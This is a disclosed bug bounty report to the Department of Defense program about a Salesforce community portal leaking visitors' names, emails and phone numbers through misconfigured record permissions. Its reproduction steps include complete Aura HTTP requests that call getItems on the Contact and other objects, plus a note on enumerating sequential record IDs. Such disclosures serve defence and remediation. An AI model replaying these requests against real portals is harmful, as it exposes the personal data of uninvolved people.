# ███ leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions

## Report Details
- **Report ID**: 2294930
- **URL**: https://hackerone.com/reports/2294930
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-12-22T03:08:41.886Z
- **Disclosed**: 2024-03-22T17:55:12.446Z

## Reporter
- **Username**: oxylis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Dear DoD team,

The ████████ is leaking a large amount of sensitive data, including **full names, email addresses and phone numbers**. These are accessible by any registered user, as there is no additional verification. 

Any registered user of the portal is able to gain access to records other users (most likely visitors using the platform to complete security checks).

The specific vulnerable objects presenting a risk are:

Contact
Account
AccountContactRelation

As the website states that over ████████ every year, the extent of this leak may be affecting hundreds of thousands of users.

████

Hope you find this report helpful - look forward to your feedback.

## Impact

Large-scale user PII leak.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Navigate to █████
2. Append the link to ██████████
3. Register a new user, verify via email
4. Log into the portal (if not automatically logged in after following link in email and setting new password)
5. Capture a POST request to the █████ endpoint, such as one below (containing the aura.token). This will return only 2000 records - however note that Salesforce Id's are sequential and can be easily enumerated via the GetRecord Aura controller.


POST ███████?r=3&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/1.1
Host: ███
Cookie: ███
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/█████████ Firefox/119.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: ██████████t=1703212778793
X-Sfdc-Page-Scope-Id: ab32d6b8-b3fc-4612-8bc1-3b0c8163e8f0
X-Sfdc-Request-Id: 251200000054548e63
X-Sfdc-Page-Cache: 44256e663456d3d8
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1336
Origin: █████████
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2283%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%228c568ef8-3954-4997-930c-542a81f9e8eb%22%2C%22publishedChangelistNum%22%3A61%2C%22audienceKey%22%3A%22cp38y0onxM9f4QchAW2Mkg%22%7D%2C%22version%22%3A%2259.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22Q0FGdjJNU2hrWnJiekVjWXdRVlJ4d08ySzBfZjVsY04wOG9fYlRpVWRXUEEyNDYuMTUuNS0zLjAuNA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22xUUH_isHmNQqCOJ9yNTV7A%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2F████%2Fs%2F%3Ft%3D1703212778793&aura.token=█████..█████████


6. Modify the request as follows and send:

POST ███?r=3&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/1.1
Host: ██████████
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/██████ Firefox/119.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: ████t=1703212778793
X-Sfdc-Page-Scope-Id: ab32d6b8-b3fc-4612-8bc1-3b0c8163e8f0
X-Sfdc-Request-Id: 251200000054548e63
X-Sfdc-Page-Cache: 44256e663456d3d8
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1141
Origin: █████████
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message={"actions":[{"id":"123;a","descriptor":"███/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22Q0FGdjJNU2hrWnJiekVjWXdRVlJ4d08ySzBfZjVsY04wOG9fYlRpVWRXUEEyNDYuMTUuNS0zLjAuNA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22xUUH_isHmNQqCOJ9yNTV7A%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2F████████%2Fs%2F%3Ft%3D1703212778793&aura.token=█████████..██████████

7. Replace the value of the entityNameOrId field in the request body to test other objects (Account, AccountContactRelation, User etc)

## Suggested Mitigation/Remediation Actions
██████████
https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae
█████████



## Attachments
No attachments
